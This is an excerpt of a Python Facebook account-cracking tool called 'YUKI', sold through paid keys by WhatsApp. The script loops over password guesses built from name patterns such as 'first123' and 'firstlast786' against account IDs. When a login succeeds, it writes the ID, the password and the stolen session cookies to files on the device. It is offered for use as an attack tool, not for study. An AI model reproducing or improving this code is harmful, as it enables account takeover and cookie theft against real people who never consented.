...
def getKey():
    ...
    id = "".join(uuidd).replace("_","").replace("360","YUKI").replace("u","9").replace("a","A")
...
\033[1;37m[+] Github       :       https://github.com/YukihiraSen
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('[+] IF you are need user use auto pass');linex();print('[1] Crack with auto pass \n[2] crack with choice pass ');linex()
                                ppp=input('[+] Choose: ')
                                if ppp in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/100070851690160/posts/pfbid03612nLTNQNQfHGoaPCteRetvnqCrDy7bbpBK5N1XFKAJuAgHkeFVFBeqcouaAcGwql/?app=fbl');menu() 
                        elif xd in ['5','05']:
                                crack()                               
                        elif xd in ['6','06']:
                                ...
                                exit(' THANKS FOR USE YUKI TOOL ')
                        else:
                                exit(' Select valid option .')                
                else:
                        print("\033[1;32m YUKI SERVER IS OFF")
...
def za():
    ...
    if myid in str(body):
        ...
        print("[+] Your key : "+myid)
        linex()
        print("[+] Price 100 validity 15 days ")
        print("[+] I will accept all types of  payment method like gcash, load")
        linex()
        input("[+] press enter to send key")
        linex();print("[+]You are not paid user ");linex()
        url_wa = "https://api.whatsapp.com/send?phone=+639635303304&text="
        name = input("[+] Type your name ")
        tks = ("Hi Rey BRO I WANT TO BUY YOUR PAID TOOL V 7.2 PLEASE ACCEPT MY KEY FOR PREMIUM \nMy name : "+name+" \nMy Key : "+myid)
        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
        print("\033[1;37m run again python test.enc.py")
...
def crack():
                                        ...
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
                                        print('\033[1;32m Out of Philippines working password\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
                                        linex()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                open('/sdcard/YUKI_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YUKI_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/YUKI-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [YUKI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/YUKI_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YUKI_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              #  open('/sdcard/YUKI-M2-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [YUKI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/YUKI_OK_ids_M3.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YUKI_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               # open('/sdcard/YUKI-M3-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [YUKI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/YUKI_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YUKI_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/YUKI-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [YUKIbrand] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/YUKI-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
